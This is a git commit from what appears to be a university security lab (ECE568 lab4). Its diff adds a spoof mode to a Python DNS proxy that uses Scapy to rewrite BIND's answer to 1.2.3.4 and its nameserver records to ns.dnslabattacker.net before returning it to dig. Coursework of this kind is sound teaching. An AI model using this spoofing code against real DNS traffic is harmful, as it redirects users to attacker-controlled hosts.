22da58f6181192c752bd748ddf5230d717b0b358
Junyu  Ma <joshua.ma@mail.utoronto.ca>
2024-04-04 01:28:08 -0400

    part 3

--- ECE568-lab4/lab4/dnsproxy_starter.py
+++ ECE568-lab4/lab4/dnsproxy_starter.py
@@ -22,6 +22,7 @@ SPOOF = args.spoof_response
 
 #python2 dnsproxy_starter.py --port <PROXY port number> --dns_port <NAMED port number>.
 #python2 dnsproxy_starter.py --port 4704 --dns_port 4702
+#python2 dnsproxy_starter.py --port 4704 --dns_port 4702 --spoof_response
 print(port, dns_port)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -30,16 +31,36 @@ sock.bind(("127.0.0.1", port))
 while True:
     #receive data from dig and remember its addr
     data = sock.recvfrom(8192)
-    print("dig data:",data[0], "dig addr", data[1])
+    #print("dig data:",data[0], "dig addr", data[1])
     dig_addr = data[1]
 
     #send received data to BIND server
     sock.sendto(data[0], ("127.0.0.1", dns_port))
 
     data = sock.recvfrom(8192)
-    print("BIND data:",data[0], "BIND addr", data[1])
+    #print("BIND data:",data[0], "BIND addr", data[1])
 
-    #send to dig
-    sock.sendto(data[0], dig_addr)
+    if SPOOF:
+        # Parse the packet from the string
+        packet = DNS(data[0])
+
+        # Show the parsed packet
+        print("Parsed packet:")
+        print(packet.show())
+        print("here")
+        print("\n\n\n\n")
+        print(packet[DNS].an.rdata)
+
+        # Change Ip
+        packet[DNS].an.rdata = "1.2.3.4"
+        # change naming server
+        packet[DNS].ns[0].rdata = "ns.dnslabattacker.net"
+        packet[DNS].ns[1].rdata = "ns.dnslabattacker.net"
+
+        #change packet to string and send
+        sock.sendto(str(packet), dig_addr)
+    else:
+        #send to dig
+        sock.sendto(data[0], dig_addr)
 
     
